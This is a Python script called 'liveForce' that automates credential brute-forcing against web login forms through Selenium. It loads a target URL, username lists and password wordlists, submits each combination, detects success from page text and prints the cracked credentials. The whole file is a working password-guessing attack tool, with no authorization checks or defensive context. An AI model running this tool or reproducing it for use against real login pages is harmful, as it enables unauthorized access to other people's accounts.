import sys, os, platform, argparse, time, validators
from termcolor import colored
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.keys import Keys

arg_parser = argparse.ArgumentParser()
arg_parser.add_argument('-u', '--username', help='Set the username')
arg_parser.add_argument('-U', '--username-list', help='Select a username wordlist')
arg_parser.add_argument('-w', '--wordlist', help='Select the wordlist')
arg_parser.add_argument('-d', '--delay', help='Set the delay time [Default: 0 secs]', type=int, default=0)
arg_parser.add_argument('-l', '--url', help='Set the URL for the attack')
arg_parser.add_argument('-fs', '--field-selector', help='Set the field selector [Default: name]', default='name')
arg_parser.add_argument('-uf', '--username-field', help='Set the username field')
arg_parser.add_argument('-pf', '--password-field', help='Set the password field')
arg_parser.add_argument('-t', '--text', help='Set the evaluation text')
arg_parser.add_argument('-a', '--auth', help='Set auth text evaluation: fail | pass [Default: fail]', default='fail')
arg_parser.add_argument('-ub', '--ublock', help='Uses the Ublock extension for faster speed [Default: True]', action='store_true', default=False)
arg_parser.add_argument('-hb', '--headless-browser', help='Uses the headless browser mode. Overrides ublock to False [Default: False]', action='store_true', default=False)
arg_parser.add_argument('-nc', '--no-colors', help='Don\'t use colors, for primitive terminals [Default: False]', action='store_true', default=False)
args = arg_parser.parse_args()

banner = """

 ██▓     ██▓ ██▒   █▓▓█████   █████▒▒█████   ██▀███   ▄████▄  ▓█████ 
▓██▒    ▓██▒▓██░   █▒▓█   ▀ ▓██   ▒▒██▒  ██▒▓██ ▒ ██▒▒██▀ ▀█  ▓█   ▀ 
▒██░    ▒██▒ ▓██  █▒░▒███   ▒████ ░▒██░  ██▒▓██ ░▄█ ▒▒▓█    ▄ ▒███   
▒██░    ░██░  ▒██ █░░▒▓█  ▄ ░▓█▒  ░▒██   ██░▒██▀▀█▄  ▒▓▓▄ ▄██▒▒▓█  ▄ 
░██████▒░██░   ▒▀█░  ░▒████▒░▒█░   ░ ████▓▒░░██▓ ▒██▒▒ ▓███▀ ░░▒████▒
░ ▒░▓  ░░▓     ░ ▐░  ░░ ▒░ ░ ▒ ░   ░ ▒░▒░▒░ ░ ▒▓ ░▒▓░░ ░▒ ▒  ░░░ ▒░ ░
░ ░ ▒  ░ ▒ ░   ░ ░░   ░ ░  ░ ░       ░ ▒ ▒░   ░▒ ░ ▒░  ░  ▒    ░ ░  ░
  ░ ░    ▒ ░     ░░     ░    ░ ░   ░ ░ ░ ▒    ░░   ░ ░           ░   
    ░  ░ ░        ░     ░  ░           ░ ░     ░     ░ ░         ░  ░
                 ░                                   ░               
                    Made by Hydr4
"""

print(banner)

if not len(sys.argv) > 1:
    print('\nTo get started, use the -h | --help switch')
    sys.exit()

nc = False
ub = True
hb = False
if args.no_colors:
    nc = True
if not args.ublock:
    ub = False
if args.headless_browser:
    hb = True

username = args.username
username_list = args.username_list
wordlist = args.wordlist
delay = args.delay
text = args.text
auth = args.auth
url = args.url
field_selector = args.field_selector
username_field = args.username_field
password_field = args.password_field

if wordlist==None:
    print('ERROR: Wordlist not defined')
    sys.exit()

if not os.path.isfile(wordlist):
    print('ERROR: Wordlist not found')
    sys.exit()
if username==None and username_list==None:
    print('ERROR: Username not defined')
    sys.exit()

if username!=None:
    force_mode = 1
    username_list = '[NOT SELECTED]'
else:
    force_mode = 2
    username_show = '[NOT SELECTED]'
    if not os.path.isfile(username_list):
        print('ERROR: username list not found')
        sys.exit()
    else:
        f = open(username_list, 'r')
        username_list = f.read().strip()
        f.close()
        username_list = username_list.split('\n')

if text==None:
    print('ERROR: Eval text not defined')
    sys.exit()
if url==None:
    print('ERROR: URL not defined')
    sys.exit()
if not validators.url(url):
    print('ERROR: Malformed URL')
    sys.exit()
if username_field==None:
    print('ERROR: Username field not defined')
    sys.exit()
if password_field==None:
    print('ERROR: Password field not defined')
    sys.exit()
if not auth in ['pass', 'fail']:
    print('ERROR: incorrect eval auth argument')
    sys.exit()
if not field_selector in ['name', 'id', 'class']:
    print('ERROR: incorrect field selector argument')
    sys.exit()

f = open(wordlist, 'r')
wordlist = f.read().strip()
f.close()
passwords = wordlist.split('\n')


options = Options()
if hb:
    options.add_argument("--headless")
    ub = False
if ub:
    options.add_extension('data/ublock.crx')
options.add_argument('--disable-gpu')
options.add_argument("--log-level=3")

if username=='':
    username_show = '[EMPTY]'
if username_list=='[NOT SELECTED]':
    username_list_show = '[NOT SELECTED]'
else:
    username_list_show = str(len(username_list))

print('\n[SCHEMATICS]\n')
if nc:
    print('URL: ' + url)
    print('Username: ' + username_show)
    print('Username combinations: ' + username_list_show)
    print('Password combinations: ' + str(len(passwords)))
    print('Username field: ' + username_field)
    print('Password field: ' + password_field)
    print('Field selector: ' + field_selector)
    print('Auth mode: ' + auth)
    print('Eval text: ' + text)
    print('Delay (secs): ' + str(delay))
else:
    print('URL: ' + colored(url, 'yellow'))
    print('Username: ' + colored(username_show, 'yellow'))
    print('Username combinations: ' + colored(username_list_show, 'yellow'))
    print('Password combinations: ' + colored(len(passwords), 'yellow'))
    print('Username field: ' + colored(username_field, 'yellow'))
    print('Password field: ' + colored(password_field, 'yellow'))
    print('Field selector: '+ colored(field_selector, 'yellow'))
    print('Auth mode: ' + colored(auth, 'yellow'))
    print('Eval text: ' + colored(text, 'yellow'))
    print('Delay (secs): ' + colored(delay, 'yellow'))

if platform.system()=="Windows":
    web = webdriver.Chrome('data/chromedriver_win32.exe', options=options)
elif platform.system()=="Linux":
    web = webdriver.Chrome('data/chromedriver_linux64', options=options)
elif platform.system()=="Darwin":
    web = webdriver.Chrome('data/chromedriver_mac64', options=options)
else:
    print("ERROR: The operating system you are running is not supported")
    sys.exit()

web.get(url)
success = False

print('\n\nliveForce thread initiated:\n')

if force_mode == 1:

    total = str(len(passwords))
    i = 0

    for password in passwords:
        if field_selector=='name':
            username_elem = web.find_element_by_name(username_field)
            password_elem = web.find_element_by_name(password_field)
        elif field_selector=='id':
            username_elem = web.find_element_by_id(username_field)
            password_elem = web.find_element_by_id(password_field)
        else:
            username_elem = web.find_element_by_class_name(username_field)
            password_elem = web.find_element_by_class_name(password_field)
        username_elem.send_keys(username)
        password_elem.send_keys(password)
        password_elem.send_keys(Keys.ENTER)

        time.sleep(delay)
        if auth=='pass':
            if (web.execute_script("if (document.body.innerHTML.search('"+text+"') != '-1') {return true} else {return false}")):
                success = True
        else:
            if not (web.execute_script("if (document.body.innerHTML.search('"+text+"') != '-1') {return true} else {return false}")):
                success = True

        if success:
            if nc:
                print('\n\nPassword found -> {}'.format(password))
            else:
                print('\n\nPassword found -> ' + colored(password, 'green'))
            break

        if nc:
            print('[incorrect]: '+password)
        else:
            print(colored('[incorrect]: ', 'red') + password.strip())

        i+=1
        print('['+str(i)+' out of '+total+']', end="\r")

        web.get(url)

    if not success:
        if nc:
            print('\n[FAILURE] -> liveForce failed')
        else:
            print(colored('\n[FAILURE] -> ', 'red') + 'liveForce failed')

elif force_mode==2:

    total = str(len(username_list * len(passwords)))
    i = 0

    for username in username_list:
        for password in passwords:
            if field_selector=='name':
                username_elem = web.find_element_by_name(username_field)
                password_elem = web.find_element_by_name(password_field)
            elif field_selector=='id':
                username_elem = web.find_element_by_id(username_field)
                password_elem = web.find_element_by_id(password_field)
            else:
                username_elem = web.find_element_by_class_name(username_field)
                password_elem = web.find_element_by_class_name(password_field)
            username_elem.send_keys(username)
            password_elem.send_keys(password)
            password_elem.send_keys(Keys.ENTER)

            time.sleep(delay)
            if auth=='pass':
                if (web.execute_script("if (document.body.innerHTML.search('"+text+"') != '-1') {return true} else {return false}")):
                    success = True
            else:
                if not (web.execute_script("if (document.body.innerHTML.search('"+text+"') != '-1') {return true} else {return false}")):
                    success = True

            if success:
                if nc:
                    print('\n\nCredentials found -> username: '+username+' || password: '+password)
                else:
                    print('\n\nCredentials found -> username: '+colored(username, 'green')+' || password: '+colored(password, 'green'))
                break

            if nc:
                print('[incorrect]: '+username+' || '+password)
            else:
                print(colored('[incorrect]: ', 'red') +username+' || '+password)

            i+=1
            print('['+str(i)+' out of '+total+']', end="\r")

            web.get(url)

    if not success:
        if nc:
            print('\n[FAILURE] -> liveForce failed')
        else:
            print(colored('\n[FAILURE] -> ', 'red') + 'liveForce failed')

web.quit()